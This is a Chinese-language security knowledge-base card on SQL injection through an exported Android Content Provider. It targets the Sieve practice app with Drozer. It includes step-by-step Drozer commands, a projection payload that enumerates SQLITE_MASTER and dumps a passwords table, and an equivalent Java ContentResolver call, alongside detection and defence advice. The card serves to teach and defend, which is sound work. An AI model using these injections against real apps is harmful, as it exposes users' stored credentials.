---
id: mobile-android-content-provider-projection-sql-injection-sqlite-master
title: Android Content Provider projection/selection SQL 注入：Drozer 扫描后用 SQLITE_MASTER 枚举表并读取数据库
type: scenario
domain: mobile
path: mobile/android
technique: android-content-provider-sql-injection-projection-selection
tags:
- android
- content-provider
- sqli
- drozer
- sqlite
- projection
- selection
- data-disclosure
- mobile
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V333
  verified_at: '2026-11-08T18:20:15+08:00'
  notes: 已对照原文与本地61张图核对：img56 provider 权限（DBContentProvider/FileBackupProvider Read/Write 均 null，/Keys 路径需 READ_KEYS/WRITE_KEYS）、img57 finduris 报 Passwords/Keys Able to Query、img58 injection 在 Projection 与 Selection 均报 Keys/Passwords 可注入、img59 projection 注入 * FROM SQLITE_MASTER WHERE type='table';-- 返回 android_metadata/Passwords/Key 三表及建表语句、img60 常规查询返回 _id/service/username/password/email 列，均与卡一致；PoC 命令与截图逐字一致。未验证点：未在本机复跑 Drozer；Sieve 1.0 为官方练习 App 非真实产品，原文未标受影响版本，已 --clear；selection 的 1=1 载荷为通用说明，原文未给出该条具体输出。卡内无 sources/source_url/文章 ID/长段摘录。
url: /docs/mobile/android/mobile-android-content-provider-projection-sql-injection-sqlite-master/
draft: false
kb_aliases:
- Content Provider SQL 注入
- drozer scanner.provider.injection
- projection 注入
- selection 注入
- SQLITE_MASTER 枚举
- Sieve DBContentProvider
---

## 一句话结论

导出的 Content Provider 若把 `query()` 的 projection/selection 直接拼进 SQL，而非使用占位符与 selectionArgs，攻击者可用 Drozer 的 `app.provider.query` 把 `* FROM SQLITE_MASTER WHERE type='table';--` 注入 projection，枚举所有表与建表语句，并继续读取目标表数据。

## 原理

- `ContentProvider.query(uri, projection, selection, selectionArgs, sortOrder)` 最终进入 SQLite 查询。若实现用 `db.query(table, projection, selection, ...)` 或字符串拼接且原样使用 projection/selection，则这两处都是 SQL 注入点：projection 对应 `SELECT <projection> FROM ...`，selection 对应 `WHERE <selection>`。
- 因为 projection 在 `FROM` 之前拼接，注入 `* FROM SQLITE_MASTER WHERE type='table';--` 可改变整条 SELECT 的表与条件，`--` 注释掉后续 SQL；`SQLITE_MASTER` 是 SQLite 元数据表，`sql` 列保存建表语句，泄露完整 schema。
- selection 注入同理可改写 WHERE 条件，配合 projection 或直接用 `--selection "1=1"` 拉全表。
- Drozer 的 `scanner.provider.injection` 会对可访问 URI 分别做 projection 与 selection 探针，报告 `Injection in Projection` / `Injection in Selection`。
- 影响：在 provider 的读权限范围内任意查询 SQLite，读取密码、token 等敏感表；若 provider 还带文件读写或可写，可能进一步扩展。

## 触发条件

- Content Provider 已导出，且目标 URI 无读权限（本例 DBContentProvider 整体 `Read Permission: null`；仅 `/Keys` 路径要求 `com.mwr.example.sieve.READ_KEYS`，`Passwords` 路径不受限）。
- provider 的 query 实现直接拼接 projection/selection/sortOrder，未使用 `selectionArgs` 占位符或白名单校验。
- 攻击者可通过 Drozer agent 或自己的 App 调用 `ContentResolver.query`。

## 利用步骤

1. 查看 provider 权限与可访问 URI：
   `run app.provider.info -a com.mwr.example.sieve`（DBContentProvider Read/Write 均为 null，Path Permissions 只保护 /Keys）。
2. 枚举可查询 URI：
   `run scanner.provider.finduris -a com.mwr.example.sieve`，得到 `content://com.mwr.example.sieve.DBContentProvider/Passwords/` 等 Able to Query 项。
3. 扫描注入点：
   `run scanner.provider.injection -a com.mwr.example.sieve`，确认 `Passwords` 在 Projection 与 Selection 均可注入。
4. 用 projection 注入枚举表：
   `run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"`
   返回 `android_metadata`、`Passwords`、`Key` 三张表及 `CREATE TABLE` 语句。
5. 正常查询目标表，取列结构/数据：
   `run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/`，返回 `_id/service/username/password/email` 列。

## PoC

```bash
dz> run scanner.provider.injection -a com.mwr.example.sieve
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ \
      --projection "* FROM SQLITE_MASTER WHERE type='table';--"
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

等价第三方 App 调用（示意）：

```java
Cursor c = getContentResolver().query(
    Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords/"),
    new String[]{"* FROM SQLITE_MASTER WHERE type='table';--"},
    null, null, null);
```

## 变体与关联

- 变体（注入位置）：selection 注入改写 WHERE、sortOrder 注入（`--order-by-column`）、projection 子查询外带数据。
- 变体（利用面）：若 provider 支持文件读写（`openFile`）且可写，可组合 SQLite 注入写文件或读取任意文件。
- 关联：[[mobile-android-content-provider-path-traversal-file-read-db-download]]（同一应用的 FileBackupProvider 目录遍历，同属 provider 边界失守）；[[mobile-android-intent-redirection-fileprovider-grant-uri-private-file-read]]（Content Provider/FileProvider 越权读取私有文件）。
- 边界：provider 做了投影白名单、`selectionArgs` 参数化、`SQLiteQueryBuilder.setStrict(true)` 或 URI 级读权限校验时注入失效。

## 检测与防御

- 检测特征：代码中 `query()` 把 projection/selection 直接传入 `db.query` 或字符串拼接；Drozer `scanner.provider.injection` 报告 Projection/Selection 注入；未授权 URI 可查到 `SQLITE_MASTER`。
- 防御：projection 只接受预定义列白名单；selection 使用 `?` 占位符 + `selectionArgs`；用 `SQLiteQueryBuilder.setStrict(true)` 校验投影；对敏感 URI 设置读权限/`exported=false`，敏感数据表按路径拆分权限。
